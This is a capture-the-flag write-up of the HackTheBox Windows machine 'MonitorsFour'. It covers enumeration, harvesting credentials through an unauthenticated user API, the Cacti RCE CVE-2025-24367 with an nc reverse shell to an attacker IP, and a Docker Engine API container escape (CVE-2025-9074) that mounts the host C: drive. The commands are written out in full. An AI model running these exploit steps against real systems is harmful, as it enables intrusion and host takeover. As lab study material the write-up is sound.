# MonitorsFour

**Platform:** HackTheBox
**OS:** Windows
**Tags:** API Exposure, Credential Disclosure, CVE-2025-24367, Cacti RCE, Docker, CVE-2025-9074, Container Escape, IDOR, RCE, Privilege Escalation
**Date:** 2026-05-16

An unauthenticated API endpoint on the main domain leaks user credentials. CVE-2025-24367 authenticated RCE in Cacti lands a shell as www-data inside a Docker container. CVE-2025-9074 abuses Docker Desktop's Engine API on the internal subnet to mount the host filesystem and get root.

## 1. Enumeration

Full-port service scan with Nmap. Two ports open: port 80 running nginx serving a PHP web application, and port 5985 running WinRM.

```bash
nmap -sV -sC <TARGET_IP>
nmap -sV -sC <TARGET_IP> -p-

PORT     STATE SERVICE       VERSION
80/tcp   open  http          nginx
|_http-title: MonitorsFour - Networking Solutions
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
```

Added `monitorsfour.htb` to `/etc/hosts`. Port 5985 is WinRM, which becomes relevant once credentials are found.

Virtual host fuzzing with ffuf to look for subdomains:

```bash
ffuf -u http://monitorsfour.htb \
  -H 'Host: FUZZ.monitorsfour.htb' \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -k -t 50 -ac

# cacti     [Status: 302]
```

Added `cacti.monitorsfour.htb` to `/etc/hosts`. Browsing to it reveals a Cacti network monitoring application.

```bash
gobuster dir \
  -u http://cacti.monitorsfour.htb/cacti/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -b 302
```

## 2. Credential Discovery

The main domain at `monitorsfour.htb` has an unauthenticated API endpoint that exposes user account data (including usernames and MD5 password hashes) by iterating a token parameter:

```bash
curl -s "http://monitorsfour.htb/user?token=0"
```

The response includes the admin user's MD5 hash. MD5 is fast and unsalted here, cracked immediately with a wordlist against Hashcat or an online lookup. This gives valid credentials for the Cacti application.

**Result:** Credentials obtained: `marcus:<password>`.

## 3. Shell: CVE-2025-24367 (Cacti Authenticated RCE)

The Cacti instance is vulnerable to CVE-2025-24367, an authenticated RCE vulnerability in Cacti's Graph Template functionality. With the admin credentials in hand, the exploit can be run directly.

Set up a listener first, then run the exploit:

```bash
nc -lvnp 9001
```

```bash
sudo python3 exploit.py \
  -url http://cacti.monitorsfour.htb \
  -u marcus \
  -p <password> \
  -i <ATTACKER_IP> \
  -l 9001
```

A shell lands as `www-data`. From the filesystem layout and network configuration it's clear this is a Docker container running the Cacti application, not the host itself. The user flag is accessible at `/home/marcus/user.txt` from within the container.

**Result:** Shell as `www-data` inside a Docker container. User flag at `/home/marcus/user.txt`.

## 4. Container Escape: CVE-2025-9074 (Docker Desktop API)

Network enumeration inside the container shows it sits on the `172.18.0.0/16` Docker bridge subnet. No Docker socket is mounted at `/var/run/docker.sock`, so the usual escape route is closed. However, Docker Desktop exposes an internal subnet at `192.168.65.0/24` for communication between the VM and the host.

```bash
ip addr
ip route
```

Scanning that internal subnet for port 2375 (the Docker Engine API) to check if it is exposed without authentication (CVE-2025-9074, CVSS 9.3):

```bash
for i in $(seq 1 254); do
  (curl -s --connect-timeout 1 http://192.168.65.$i:2375/version 2>/dev/null \
    | grep -q "ApiVersion" && echo "192.168.65.$i:2375 OPEN") &
done; wait

# 192.168.65.7:2375 OPEN
```

The Docker Engine API is open and unauthenticated at `192.168.65.7:2375`. On Docker Desktop for Windows, the host's `C:\` drive is accessible from the WSL2 VM at `/mnt/host/c`. The plan: create a new Alpine container via the API that mounts `/mnt/host/c` into the container, then read the root flag directly from the mounted filesystem.

On the attacker machine, craft the container payload and serve it over HTTP:

```bash
cat > /tmp/container.json << 'EOF'
{
  "Image": "alpine:latest",
  "Cmd": ["/bin/sh", "-c", "cat /mnt/host_root/Users/Administrator/Desktop/root.txt"],
  "HostConfig": {
    "Binds": ["/mnt/host/c:/mnt/host_root"]
  },
  "Tty": true,
  "OpenStdin": true
}
EOF

python3 -m http.server 8000 --directory /tmp
```

Inside the container, download the payload, create and start the container, then retrieve the logs which contain the flag output:

```bash
# Download payload
curl http://<ATTACKER_IP>:8000/container.json -o /tmp/container.json

# Create container
curl -X POST \
  -H "Content-Type: application/json" \
  -d @/tmp/container.json \
  "http://192.168.65.7:2375/containers/create?name=pwned"

# Start container
curl -X POST http://192.168.65.7:2375/containers/<CONTAINER_ID>/start

# Read logs - contains root flag
curl http://192.168.65.7:2375/containers/<CONTAINER_ID>/logs?stdout=true
```

The container runs as root within the Docker Engine context. The flag is printed directly to stdout and captured in the container logs.

**Result:** Root flag read from `C:\Users\Administrator\Desktop\root.txt` via Docker API container escape.

## 5. Flags

- User: `redacted`
- Root: `redacted`
